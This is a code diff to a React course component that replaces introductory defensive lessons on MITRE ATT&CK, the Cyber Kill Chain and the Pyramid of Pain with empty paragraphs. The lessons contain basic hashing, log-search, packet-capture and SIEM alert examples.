-    if event.description.contains("lateral movement"):
-        event.tag = "T1021"  # T1021: Remote Services (Lateral Movement)
-    `}</pre>
-              <p>
-                The MITRE ATT&CK framework has become an essential tool for modern cybersecurity, enabling organizations to take a proactive stance in understanding and mitigating threats.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -627,37 +565,7 @@ function OSWPCourse() {
           title: "MITRE ATT&CK Matrix",
           summary: (
             <>
-              <p>
-                <strong>The Structure of the ATT&CK Matrix</strong>
-              </p>
-              <p>
-                The MITRE ATT&CK Matrix is a visual representation of the adversary tactics and techniques compiled in the ATT&CK framework. The matrix organizes tactics as columns and techniques as rows, allowing analysts to quickly see which techniques are used across different stages of an attack.
-              </p>
-              <p>
-                <strong>How to Read the Matrix:</strong> Each cell in the matrix represents a technique used to achieve a particular tactical goal. For example, a cell might indicate that "Credential Dumping" is a technique under the "Credential Access" tactic.
-              </p>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Tactic:</strong> Initial Access  
-                  <br /><strong>Technique:</strong> Spear Phishing (T1566)
-                </li>
-                <li>
-                  <strong>Tactic:</strong> Lateral Movement  
-                  <br /><strong>Technique:</strong> Remote Services (T1021)
-                </li>
-              </ul>
-              <p>
-                The matrix serves as a valuable reference for security teams. By mapping observed attack behaviors to the matrix, analysts can determine which areas of their defenses may require strengthening.
-              </p>
-              <p>
-                <strong>Interactive Example:</strong> Some organizations use interactive dashboards where clicking on a tactic reveals detailed descriptions, mitigations, and real-world case studies of associated techniques.
-              </p>
-              <p>
-                Overall, the ATT&CK Matrix provides a holistic view of the attack landscape, enabling more effective threat modeling and defense planning.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -665,35 +573,7 @@ function OSWPCourse() {
           title: "MITRE ATT&CK for Cloud Matrix",
           summary: (
             <>
-              <p>
-                <strong>Introduction to the Cloud Matrix</strong>
-              </p>
-              <p>
-                As organizations increasingly migrate to cloud environments, the MITRE ATT&CK for Cloud Matrix was developed to address the unique tactics and techniques used by adversaries in cloud-based attacks. It complements the enterprise matrix by focusing on cloud-specific attack vectors.
-              </p>
-              <p>
-                <strong>Key Components:</strong> The Cloud Matrix organizes cloud attack techniques under tactics tailored to cloud environments, such as “Resource Development” and “Initial Access” with cloud-specific nuances.
-              </p>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Initial Access:</strong> Techniques like "Valid Accounts" (T1078) are adapted for cloud scenarios where attackers may use stolen credentials to access cloud services.
-                </li>
-                <li>
-                  <strong>Execution:</strong> Techniques that involve exploiting cloud management interfaces or misconfigured API gateways.
-                </li>
-              </ul>
-              <p>
-                Cloud environments require special attention due to their dynamic and scalable nature. The MITRE ATT&CK for Cloud Matrix helps organizations identify vulnerabilities in cloud configurations, enforce best practices, and detect anomalies that might indicate a breach.
-              </p>
-              <p>
-                <strong>Real-World Example:</strong> An attacker might exploit a misconfigured AWS S3 bucket to exfiltrate sensitive data. Mapping this behavior to the cloud matrix enables security teams to quickly pinpoint the relevant tactics and techniques and deploy targeted countermeasures.
-              </p>
-              <p>
-                The Cloud Matrix is a vital tool for any organization leveraging cloud services, ensuring that security measures are as dynamic and scalable as the environments they protect.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -701,56 +581,7 @@ function OSWPCourse() {
           title: "MITRE ATT&CK tactics",
           summary: (
             <>
-              <p>
-                <strong>Understanding Tactics in the ATT&CK Framework</strong>
-              </p>
-              <p>
-                Tactics in the MITRE ATT&CK framework represent the adversary’s strategic objectives during an attack. They are the high-level goals that attackers aim to achieve, such as gaining initial access, maintaining persistence, and exfiltrating data.
-              </p>
-              <p>
-                <strong>Common Tactics Include:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Initial Access:</strong> Techniques used to gain an initial foothold in the target environment (e.g., phishing, exploitation of vulnerabilities).
-                </li>
-                <li>
-                  <strong>Execution:</strong> Methods by which attackers run malicious code on a target system.
-                </li>
-                <li>
-                  <strong>Persistence:</strong> Strategies to maintain access over time, even if initial vulnerabilities are patched.
-                </li>
-                <li>
-                  <strong>Privilege Escalation:</strong> Techniques used to gain higher-level permissions on a system.
-                </li>
-                <li>
-                  <strong>Defense Evasion:</strong> Methods to avoid detection by security tools.
-                </li>
-                <li>
-                  <strong>Credential Access:</strong> Techniques aimed at stealing authentication credentials.
-                </li>
-                <li>
-                  <strong>Discovery:</strong> Actions taken to gather information about the target environment.
-                </li>
-                <li>
-                  <strong>Lateral Movement:</strong> Techniques to move through the network after initial compromise.
-                </li>
-                <li>
-                  <strong>Collection:</strong> Strategies to gather data of interest.
-                </li>
-                <li>
-                  <strong>Exfiltration:</strong> Methods used to extract data from the target.
-                </li>
-                <li>
-                  <strong>Impact:</strong> Actions intended to disrupt, degrade, or destroy systems.
-                </li>
-              </ul>
-              <p>
-                <strong>Example Scenario:</strong> An attacker might first use phishing to achieve initial access, then employ credential access techniques to steal passwords, followed by lateral movement to access critical systems, and finally exfiltrate data. Each of these steps corresponds to a distinct tactic in the framework.
-              </p>
-              <p>
-                Understanding these tactics allows defenders to map observed behaviors to specific adversary objectives and to tailor their defensive strategies accordingly.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -758,35 +589,7 @@ function OSWPCourse() {
           title: "MITRE ATT&CK techniques",
           summary: (
             <>
-              <p>
-                <strong>Deep Dive into Techniques</strong>
-              </p>
-              <p>
-                Techniques in the MITRE ATT&CK framework detail the specific methods used by adversaries to achieve each tactic. They provide granular insight into how attacks are executed, allowing security teams to develop precise detection and mitigation strategies.
-              </p>
-              <p>
-                <strong>Examples of Techniques:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Phishing (T1566):</strong> A common technique under Initial Access, where attackers send deceptive emails to trick users into revealing sensitive information.
-                </li>
-                <li>
-                  <strong>Credential Dumping (T1003):</strong> A technique under Credential Access that involves extracting account credentials from operating systems.
-                </li>
-                <li>
-                  <strong>Process Injection (T1055):</strong> A technique under Defense Evasion that involves injecting malicious code into legitimate processes.
-                </li>
-                <li>
-                  <strong>Lateral Tool Transfer (T1570):</strong> A technique used for Lateral Movement that involves transferring tools between systems to facilitate further compromise.
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Example:</strong> During an investigation, analysts may observe unusual network traffic associated with PowerShell commands. Mapping this activity to the "Process Injection" technique helps identify that an attacker is attempting to hide malicious code within legitimate processes.
-              </p>
-              <p>
-                Organizations often use the detailed technique descriptions in the ATT&CK framework to build detection rules for SIEM systems, create threat hunting queries, and prioritize remediation efforts.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -794,32 +597,7 @@ function OSWPCourse() {
           title: "MITRE ATT&CK vs. the Cyber Kill Chain",
           summary: (
             <>
-              <p>
-                <strong>Comparing Two Prominent Models</strong>
-              </p>
-              <p>
-                Both the MITRE ATT&CK framework and the Cyber Kill Chain are models used to understand and counter cyber attacks, but they differ in scope and approach. The Cyber Kill Chain, developed by Lockheed Martin, outlines a linear progression of an attack from reconnaissance to actions on objectives. In contrast, the MITRE ATT&CK framework offers a more granular and comprehensive taxonomy of adversary behaviors.
-              </p>
-              <p>
-                <strong>Key Differences:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Linear vs. Comprehensive:</strong> The Cyber Kill Chain presents a linear, step-by-step process, whereas MITRE ATT&CK provides detailed tactics and techniques that cover a wider range of adversary behaviors.
-                </li>
-                <li>
-                  <strong>Granularity:</strong> MITRE ATT&CK dives deeper into specific methods (techniques), while the Cyber Kill Chain focuses on broader phases of an attack.
-                </li>
-                <li>
-                  <strong>Usage:</strong> The Cyber Kill Chain is useful for high-level analysis and incident response, whereas MITRE ATT&CK is widely used for threat modeling, detection engineering, and proactive threat hunting.
-                </li>
-              </ul>
-              <p>
-                <strong>Example:</strong> A defender may use the Cyber Kill Chain to quickly identify which phase an attack is in and interrupt it. Alternatively, they might use MITRE ATT&CK to fine-tune detection rules and correlate multiple indicators that suggest a specific technique, such as lateral movement via Remote Services (T1021).
-              </p>
-              <p>
-                In summary, while both models are valuable, MITRE ATT&CK provides a more detailed and flexible approach, making it highly effective in modern threat detection and response.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -827,41 +605,7 @@ function OSWPCourse() {
           title: "How Do You Use the MITRE ATT&CK Matrix",
           summary: (
             <>
-              <p>
-                <strong>Applying the ATT&CK Matrix in Practice</strong>
-              </p>
-              <p>
-                The MITRE ATT&CK Matrix is not only a reference tool but also a practical resource for enhancing an organization’s security posture. By mapping incidents, alerts, and security controls to the matrix, defenders can better understand adversary behaviors, identify gaps in defenses, and prioritize mitigation efforts.
-              </p>
-              <p>
-                <strong>Steps to Utilize the Matrix:</strong>
-              </p>
-              <ol>
-                <li>
-                  <strong>Mapping Incidents:</strong> When an incident occurs, analysts map observed behaviors to corresponding tactics and techniques in the matrix. This helps in understanding the adversary’s approach and determining which areas of the network were targeted.
-                </li>
-                <li>
-                  <strong>Detection Engineering:</strong> Use the matrix to develop and refine detection rules. For example, if multiple alerts correlate with a specific technique like “Process Injection” (T1055), analysts can fine-tune their SIEM queries to better detect similar activities.
-                </li>
-                <li>
-                  <strong>Threat Hunting:</strong> Proactively search for indicators of compromise by using the matrix as a checklist of techniques that adversaries might use. This can involve writing queries in SIEM tools or using open-source threat intelligence feeds.
-                </li>
-                <li>
-                  <strong>Gap Analysis and Mitigation:</strong> Assess current security controls against the matrix to identify which techniques are not adequately covered. Then, implement additional measures to mitigate these gaps.
-                </li>
-              </ol>
-              <p>
-                <strong>Example Usage:</strong> An organization might conduct a quarterly review of its security posture by mapping recent incidents to the ATT&CK Matrix. They discover that “Credential Access” techniques such as “Brute Force” (T1110) are under-monitored. As a result, they implement stronger password policies and deploy additional monitoring on authentication systems.
-              </p>
-              <p>
-                <strong>Code Snippet Example:</strong> In a SIEM environment, an analyst could create a correlation rule such as:
-              </p>
-              <pre>{`if (event.technique == "T1055") {
-      alert("Potential Process Injection detected");
-    }`}</pre>
-              <p>
-                Ultimately, the ATT&CK Matrix is a dynamic tool that empowers security teams to improve detection, streamline incident response, and foster a culture of proactive threat hunting.
-              </p>
+              <p></p>
             </>
           )
         }
@@ -890,36 +634,7 @@ function OSWPCourse() {
           title: "What is the Pyramid of Pain",
           summary: (
             <>
-                          <img
-                src="/Learning Paths/SOC/Pyramid.png"
-                alt="Pyramid of Pain"
-                className="my-4 w-full max-w-md mx-auto"
-              />
-              <p><strong>Introduction to the Pyramid of Pain</strong></p>
-              <p>
-                The Pyramid of Pain is a conceptual model that illustrates how different types of indicators, used in threat intelligence and cyber defense, vary in the level of difficulty they impose on adversaries. Developed by David J. Bianco, the pyramid demonstrates that not all indicators are equal—while some (like hash values) are easy for attackers to change, others (like Tactics, Techniques, and Procedures or TTPs) require significant effort to alter.
-              </p>
-              <p>
-                The pyramid is structured in layers, with the simplest and most volatile indicators at the bottom and the hardest-to-change indicators at the top. As you move upward, the “pain” inflicted on an adversary increases when these indicators are disrupted or eliminated.
-              </p>
-              <p>
-                <strong>Layers of the Pyramid:</strong>
-              </p>
-              <ul>
-                <li><strong>Hash values:</strong> Easily changed file hashes.</li>
-                <li><strong>IP addresses:</strong> Often transient, can be easily replaced.</li>
-                <li><strong>Domain names:</strong> Important but can be re-registered.</li>
-                <li><strong>Network Artifacts:</strong> Log data, protocol behaviors, etc.</li>
-                <li><strong>Host Artifacts:</strong> System-level details like registry keys, file paths, or specific software versions.</li>
-                <li><strong>Tools:</strong> Specific malware or hacking tools used by attackers.</li>
-                <li><strong>Tactics, Techniques, and Procedures (TTPs):</strong> The most resilient and difficult-to-change elements that define how an adversary operates.</li>
-              </ul>
-              <p>
-                <strong>Real-World Example:</strong> If an organization focuses solely on indicators like hash values or IP addresses, an attacker can simply modify these attributes. However, if defenders focus on disrupting the adversary's TTPs, the attacker is forced to fundamentally change their operational approach, causing significant “pain” and disruption.
-              </p>
-              <p>
-                The Pyramid of Pain encourages organizations to prioritize defensive measures that target the most strategic aspects of an attack, thereby maximizing the impact on adversaries.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -927,32 +642,7 @@ function OSWPCourse() {
           title: "Hash values",
           summary: (
             <>
-              <p><strong>Understanding Hash Values as Indicators</strong></p>
-              <p>
-                Hash values are unique fingerprints generated by cryptographic hash functions (e.g., MD5, SHA-1, SHA-256) for files or data. They serve as indicators of compromise (IOCs) by identifying specific malicious files. However, hash values are considered the easiest indicator for adversaries to change.
-              </p>
-              <p>
-                <strong>How Hashing Works:</strong> A hash function takes input data and produces a fixed-length string that represents the input. Even a minor change in the file will produce a completely different hash.
-              </p>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  Calculating an MD5 hash:
-                  <br /><code>md5sum malware.exe</code>
-                </li>
-                <li>
-                  Using SHA-256:
-                  <br /><code>sha256sum document.pdf</code>
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Scenario:</strong> A malware sample may be identified by its SHA-256 hash. Once detected, the hash is added to threat intelligence feeds. However, attackers can easily recompile or modify their malware to generate a new hash, rendering hash-based detection less effective over time.
-              </p>
-              <p>
-                While useful for initial detection, hash values are considered a low-level indicator on the Pyramid of Pain because of their volatility.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -960,32 +650,7 @@ function OSWPCourse() {
           title: "IP addresses",
           summary: (
             <>
-              <p><strong>IP Addresses as Indicators</strong></p>
-              <p>
-                IP addresses are numerical labels assigned to devices on a network. They can be used as indicators of compromise to identify malicious activity, such as command-and-control servers or sources of attacks. However, like hash values, IP addresses are relatively easy for adversaries to change.
-              </p>
-              <p>
-                <strong>How IP Addresses Work:</strong> Devices are assigned IP addresses that can be static or dynamic. In many cases, attackers use dynamic or spoofed IP addresses to evade detection.
-              </p>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  Identifying malicious IP addresses with a tool like <code>nmap</code>:
-                  <br /><code>nmap -sV 192.168.1.0/24</code>
-                </li>
-                <li>
-                  Analyzing logs to detect repeated access from a suspicious IP:
-                  <br /><code>grep "192.0.2.100" /var/log/auth.log</code>
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Example:</strong> An intrusion detection system (IDS) might flag an IP address associated with a known threat actor. However, if the attacker shifts to a new IP or uses a proxy network, the indicator becomes less reliable. This dynamic nature makes IP addresses a moderate-level indicator on the Pyramid.
-              </p>
-              <p>
-                In summary, while IP addresses can help in tracking attacks, they require correlation with other indicators to be truly effective.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -993,32 +658,7 @@ function OSWPCourse() {
           title: "Domain names",
           summary: (
             <>
-              <p><strong>Domain Names as Indicators</strong></p>
-              <p>
-                Domain names are human-readable addresses that map to IP addresses. They are used by attackers to host malicious content, set up phishing sites, or run command-and-control servers. Like IP addresses, domain names can be easily changed, but they still provide valuable context in threat intelligence.
-              </p>
-              <p>
-                <strong>How Domain Names Work:</strong> Domain names are registered with registrars and managed via DNS. Attackers may use domain generation algorithms (DGAs) to create new domains dynamically.
-              </p>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  Checking domain details using <code>whois</code>:
-                  <br /><code>whois maliciousdomain.com</code>
-                </li>
-                <li>
-                  Resolving domain names with <code>nslookup</code>:
-                  <br /><code>nslookup maliciousdomain.com</code>
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Scenario:</strong> A phishing campaign may use a domain that resembles a legitimate site, such as <code>amaz0n.com</code> instead of <code>amazon.com</code>. Once detected, security teams can block the domain and update threat intelligence feeds. Despite the ease of domain switching, the information provided by a domain name, such as its registration history and associated IP addresses, is invaluable.
-              </p>
-              <p>
-                Domain names, when used in conjunction with other indicators, can enhance an organization's threat-hunting capabilities.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -1026,34 +666,7 @@ function OSWPCourse() {
           title: "Network Artifacts",
           summary: (
             <>
-              <p><strong>Understanding Network Artifacts</strong></p>
-              <p>
-                Network artifacts are pieces of evidence found in network traffic and logs that indicate suspicious or malicious activity. These include packet captures, flow data, protocol anomalies, and log entries from devices such as routers, switches, and firewalls.
-              </p>
-              <p>
-                <strong>Examples of Network Artifacts:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Packet Captures:</strong> Using tools like Wireshark to capture and analyze network traffic can reveal malicious payloads or abnormal communication patterns.
-                </li>
-                <li>
-                  <strong>Flow Data:</strong> NetFlow data can be used to monitor bandwidth usage and detect unusual data transfers.
-                </li>
-                <li>
-                  <strong>Log Files:</strong> Firewall and IDS logs often contain artifacts such as repeated connection attempts or unusual protocols that can indicate an attack.
-                </li>
-              </ul>
-              <p>
-                <strong>Example Command:</strong> Capture network traffic on an interface:
-              </p>
-              <pre>{`sudo tcpdump -i eth0 -w capture.pcap`}</pre>
-              <p>
-                Analyzing these artifacts helps defenders identify patterns and anomalies that correlate with malicious behavior. While network artifacts can be more challenging for attackers to modify, they often require sophisticated analysis to extract meaningful insights.
-              </p>
-              <p>
-                Effective monitoring of network artifacts is a key component of threat detection and incident response.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -1061,31 +674,7 @@ function OSWPCourse() {
           title: "Host Artifacts",
           summary: (
             <>
-              <p><strong>Understanding Host Artifacts</strong></p>
-              <p>
-                Host artifacts are indicators that reside on individual computers or servers. They include file paths, registry keys, system logs, and configuration files that can reveal evidence of compromise or malicious activity on a specific host.
-              </p>
-              <p>
-                <strong>Examples of Host Artifacts:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>File System Changes:</strong> Newly created or modified files in sensitive directories. For instance, unexpected executables in the Windows <code>C:\Windows\Temp</code> folder.
-                </li>
-                <li>
-                  <strong>Registry Modifications:</strong> Changes to critical registry keys that control system behavior.
-                </li>
-                <li>
-                  <strong>System Logs:</strong> Windows Event Logs or Linux syslogs that may indicate unauthorized access, failed logins, or unusual process behavior.
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Example:</strong> An analyst might notice an unfamiliar process running on a workstation and then check the system logs or file system artifacts. Using PowerShell:
-              </p>
-              <pre>{`Get-EventLog -LogName Security -Newest 50 | Where-Object { $_.EventID -eq 4625 }`}</pre>
-              <p>
-                Such artifacts help pinpoint the origin of an attack and are more difficult for adversaries to change without overhauling their entire methodology.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -1093,37 +682,7 @@ function OSWPCourse() {
           title: "Tools",
           summary: (
             <>
-              <p><strong>Security Tools and Their Role</strong></p>
-              <p>
-                Tools are critical components of a cyber defender’s arsenal. In the context of the Pyramid of Pain, tools represent the software and systems that collect, analyze, and correlate various indicators of compromise. While tools themselves can sometimes be replaced or updated by attackers, they provide invaluable insights into adversary behavior.
-              </p>
-              <p>
-                <strong>Examples of Security Tools:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>SIEM Systems:</strong> Tools like Splunk, ELK, and QRadar aggregate logs from across an organization, helping to correlate events and detect anomalies.
-                </li>
-                <li>
-                  <strong>Threat Intelligence Platforms:</strong> Platforms such as Recorded Future or MISP consolidate threat data, including indicators like IPs, domains, and TTPs.
-                </li>
-                <li>
-                  <strong>Network Analyzers:</strong> Tools like Wireshark and tcpdump capture and analyze network traffic for forensic analysis.
-                </li>
-                <li>
-                  <strong>Endpoint Detection and Response (EDR):</strong> Solutions like CrowdStrike Falcon or SentinelOne monitor host activities and provide detailed forensic data.
-                </li>
-              </ul>
-              <p>
-                <strong>Practical Example:</strong> An organization may use a SIEM to aggregate logs from various sources and then apply correlation rules based on MITRE ATT&CK or the Pyramid of Pain to flag suspicious activities. For instance:
-              </p>
-              <pre>{`# Pseudo-code for a SIEM rule
-    if (log.event == "file_created" && file.hash in known_malicious_hashes) {
-      alert("Malicious file detected");
-    }`}</pre>
-              <p>
-                These tools provide the backbone for effective threat detection, enabling defenders to rapidly identify and respond to attacks.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -1131,36 +690,7 @@ function OSWPCourse() {
           title: "Tactics, Techniques and Procedures (TTPs)",
           summary: (
             <>
-              <p><strong>Understanding TTPs in the Context of the Pyramid</strong></p>
-              <p>
-                Tactics, Techniques, and Procedures (TTPs) represent the behavioral patterns and methods used by adversaries during an attack. Unlike technical indicators like hash values or IP addresses, TTPs are difficult for attackers to change and therefore cause the greatest "pain" when disrupted.
-              </p>
-              <p>
-                <strong>Components of TTPs:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Tactics:</strong> The high-level objectives of an attack (e.g., initial access, lateral movement, exfiltration).
-                </li>
-                <li>
-                  <strong>Techniques:</strong> The specific methods employed to achieve each tactic. For example, “Process Injection” or “Credential Dumping.”
-                </li>
-                <li>
-                  <strong>Procedures:</strong> Detailed, repeatable actions that adversaries perform during an attack. These may include the use of specific tools or commands.
-                </li>
-              </ul>
-              <p>
-                <strong>Real-World Example:</strong> An attacker might use spear phishing (a technique) to achieve initial access (a tactic) and then perform credential dumping (another technique) to move laterally within a network. This sequence of actions forms the attacker’s TTPs.
-              </p>
-              <p>
-                <strong>Importance in Cyber Defense:</strong> Because TTPs reflect the adversary’s behavior and mindset, detecting and mitigating them can force attackers to change their methods entirely—an outcome that is particularly disruptive.
-              </p>
-              <p>
-                <strong>Example in Practice:</strong> Defenders may analyze incident data and map it to known TTPs using frameworks like MITRE ATT&CK. This mapping can then inform proactive threat hunting and tailored security measures.
-              </p>
-              <p>
-                By focusing on TTPs, organizations can develop more resilient defenses that are harder for attackers to circumvent, thus maximizing the impact on the adversary’s operations.
-              </p>
+              <p></p>
             </>
           )
         }
